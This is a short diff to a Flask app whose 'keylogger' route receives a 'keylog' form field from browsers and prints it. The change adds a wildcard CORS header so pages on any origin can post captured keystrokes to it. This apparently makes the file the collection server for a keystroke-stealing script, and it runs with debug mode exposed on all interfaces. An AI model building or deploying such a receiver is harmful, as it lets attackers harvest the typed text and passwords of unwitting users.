@@ -1,6 +1,4 @@
-
-# from flask import Flask, render_template, url_for, flash, redirect
-from flask import Flask, render_template, url_for, flash, redirect, request
+from flask import Flask, render_template, jsonify, request
 from flask_behind_proxy import FlaskBehindProxy
 app = Flask(__name__)
 proxied = FlaskBehindProxy(app)
@@ -20,7 +18,11 @@ def keylogger():
     keylog = request.form.get('keylog')
 
     print("keylog: ",keylog)
-    return '', 204
+
+    response = jsonify({"test":"test"})
+    response.headers.add('Access-Control-Allow-Origin', '*')
+    return response
+    # return '', 204
 
 if __name__ == '__main__':
     app.run(debug=True, host="0.0.0.0")
